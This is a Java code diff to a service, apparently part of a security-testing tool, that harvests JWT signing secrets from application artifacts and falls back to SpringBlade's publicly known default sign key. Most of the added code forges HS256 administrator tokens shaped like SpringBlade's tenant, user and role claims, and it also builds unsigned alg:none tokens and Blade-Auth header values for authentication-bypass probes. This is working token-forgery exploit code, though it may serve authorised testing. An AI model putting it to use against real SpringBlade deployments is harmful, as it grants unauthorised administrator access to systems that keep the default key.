@@ -32,8 +32,8 @@ public final class SyntheticIdentityService {
             "(?i)(?:jwt[_\\-.]?(?:secret|sign(?:ing)?[_\\-.]?key|key)|blade[_\\-.]?token[_\\-.]?sign[_\\-.]?key)"
                     + "\\s*[=:]\\s*[\"']?([A-Za-z0-9+/=_\\-.]{8,128})");
     private static final List<String> BLADE_DEFAULT_SECRETS = List.of(
-            "00000000000000000000000000000000",
-            "bladexisapowerfulmicroservicearchitectureupgradedandoptimizedfromacommercialproject");
+            AuthCodeQueryService.BLADE_DEFAULT_SIGN_KEY,
+            AuthCodeQueryService.BLADE_LEGACY_ZERO_KEY);
 
     public record SyntheticIdentity(
             IdentityTrack track,
@@ -50,27 +50,49 @@ public final class SyntheticIdentityService {
     public record MaterialBundle(
             Optional<String> jwtSecret,
             String secretProvenance,
-            List<String> notes
-    ) { }
+            List<String> notes,
+            boolean bladeSurface,
+            boolean preferBladeAuthHeader
+    ) {
+        public MaterialBundle(Optional<String> jwtSecret, String secretProvenance, List<String> notes) {
+            this(jwtSecret, secretProvenance, notes, false, false);
+        }
+    }
 
     public MaterialBundle harvest(Path artifactPath) {
         List<String> notes = new ArrayList<>();
         Optional<String> secret = Optional.empty();
         String provenance = "MOCK";
+        boolean bladeSurface = false;
         if (artifactPath != null && Files.isRegularFile(artifactPath)) {
             try {
-                secret = scanZipForSecret(artifactPath, notes);
-                if (secret.isPresent()) provenance = "RULE_GENERATED";
+                AuthCodeQueryService.AuthCodeQueryResult code =
+                        new AuthCodeQueryService().query(artifactPath, "", 20);
+                bladeSurface = code.bladeSurface() || code.jwtDefaultKeyMatched();
+                if (code.jwtDefaultKeyMatched()) {
+                    secret = Optional.of(AuthCodeQueryService.BLADE_DEFAULT_SIGN_KEY);
+                    provenance = "RULE_GENERATED";
+                    notes.add("matched Blade default sign-key via code_query ("
+                            + code.preferredSignKeyProvenance() + ")");
+                } else {
+                    secret = scanZipForSecret(artifactPath, notes);
+                    if (secret.isPresent()) {
+                        provenance = "RULE_GENERATED";
+                    }
+                }
             } catch (IOException ignored) {
                 notes.add("artifact scan failed; falling back to known defaults");
             }
         }
         if (secret.isEmpty()) {
-            secret = Optional.of(BLADE_DEFAULT_SECRETS.get(0));
+            // Prefer the well-known Blade sign-key over the legacy all-zero placeholder.
+            secret = Optional.of(AuthCodeQueryService.BLADE_DEFAULT_SIGN_KEY);
             provenance = "MOCK";
-            notes.add("using platform MOCK Blade-style default signing material");
+            notes.add("using platform MOCK Blade default sign-key (bladex…)");
         }
-        return new MaterialBundle(secret, provenance, List.copyOf(notes));
+        boolean preferBlade = bladeSurface
+                || secret.map(AuthCodeQueryService.BLADE_DEFAULT_SIGN_KEY::equals).orElse(false);
+        return new MaterialBundle(secret, provenance, List.copyOf(notes), bladeSurface, preferBlade);
     }
 
     public SyntheticIdentity synthesize(IdentityTrack track, MaterialBundle materials) {
@@ -204,12 +226,37 @@ public final class SyntheticIdentityService {
      * signature is Base64URL of a deterministic HMAC-like digest over secret+payload.
      * Enough for MOCK/RULE_GENERATED path experiments against apps that accept the default key.
      */
+    /**
+     * Minimal HS256 JWT. Claims follow SpringBlade SecureUtil/TokenUtil shape
+     * (tenant_id / user_id / role_name / client_id) so filters that read those
+     * claims are more likely to accept MOCK/RULE_GENERATED material.
+     */
     static String mintHs256Token(String secret, String role, IdentityTrack track) {
         String header = b64Url("{\"alg\":\"HS256\",\"typ\":\"JWT\"}");
-        String payload = b64Url("{\"role\":\"" + role + "\",\"user_name\":\"" + role
-                + "\",\"account\":\"veyrion-" + track.name().toLowerCase(Locale.ROOT)
-                + "\",\"client_id\":\"sword\",\"license\":\"powered by bladex\","
-                + "\"iss\":\"veyrion-mock\",\"mock\":true}");
+        long now = System.currentTimeMillis() / 1000L;
+        String account = "admin".equals(role) || "administrator".equals(role)
+                ? "admin" : "veyrion-" + track.name().toLowerCase(Locale.ROOT);
+        String roleName = "administrator".equals(role) || "admin".equals(role)
+                ? "administrator" : role;
+        String payload = b64Url("{"
+                + "\"token_type\":\"access_token\","
+                + "\"tenant_id\":\"000000\","
+                + "\"user_id\":\"1123598821738675201\","
+                + "\"dept_id\":\"1123598813738675202\","
+                + "\"post_id\":\"1123598817738675201\","
+                + "\"role_id\":\"1123598816738675201\","
+                + "\"account\":\"" + account + "\","
+                + "\"user_name\":\"" + account + "\","
+                + "\"nick_name\":\"" + account + "\","
+                + "\"role_name\":\"" + roleName + "\","
+                + "\"client_id\":\"saber\","
+                + "\"license\":\"powered by bladex\","
+                + "\"iss\":\"bladex.cn\","
+                + "\"aud\":\"blade\","
+                + "\"nbf\":" + now + ","
+                + "\"exp\":" + (now + 3600) + ","
+                + "\"mock\":true"
+                + "}");
         String signingInput = header + "." + payload;
         String sig = b64Url(hmacSha256(secret.getBytes(StandardCharsets.UTF_8),
                 signingInput.getBytes(StandardCharsets.UTF_8)));
@@ -219,11 +266,24 @@ public final class SyntheticIdentityService {
     /** Unsigned JWT used only for ALG_NONE hypothesis probes (RULE_GENERATED). */
     static String mintAlgNoneToken(String role, IdentityTrack track) {
         String header = b64Url("{\"alg\":\"none\",\"typ\":\"JWT\"}");
-        String payload = b64Url("{\"role\":\"" + role + "\",\"user_name\":\"" + role
-                + "\",\"account\":\"veyrion-" + track.name().toLowerCase(Locale.ROOT)
-                + "\",\"client_id\":\"sword\",\"license\":\"powered by bladex\","
-                + "\"iss\":\"veyrion-mock\",\"mock\":true,\"algNone\":true}");
+        String account = "administrator".equals(role) || "admin".equals(role)
+                ? "admin" : "veyrion-" + track.name().toLowerCase(Locale.ROOT);
+        String payload = b64Url("{\"token_type\":\"access_token\",\"tenant_id\":\"000000\","
+                + "\"role_name\":\"administrator\",\"account\":\"" + account
+                + "\",\"user_name\":\"" + account
+                + "\",\"client_id\":\"saber\",\"license\":\"powered by bladex\","
+                + "\"iss\":\"bladex.cn\",\"mock\":true,\"algNone\":true}");
         return header + "." + payload + ".";
+    }
+
+    /** Blade-Auth channel value: scheme + token (probe layer does not auto-prefix Blade-Auth). */
+    public static String bladeAuthHeaderValue(String rawToken) {
+        if (rawToken == null || rawToken.isBlank()) return "";
+        String token = rawToken.trim();
+        if (token.regionMatches(true, 0, "bearer ", 0, 7)) {
+            return "bearer " + token.substring(7).trim();
+        }
+        return "bearer " + token;
     }
 
     private static String b64Url(String value) {
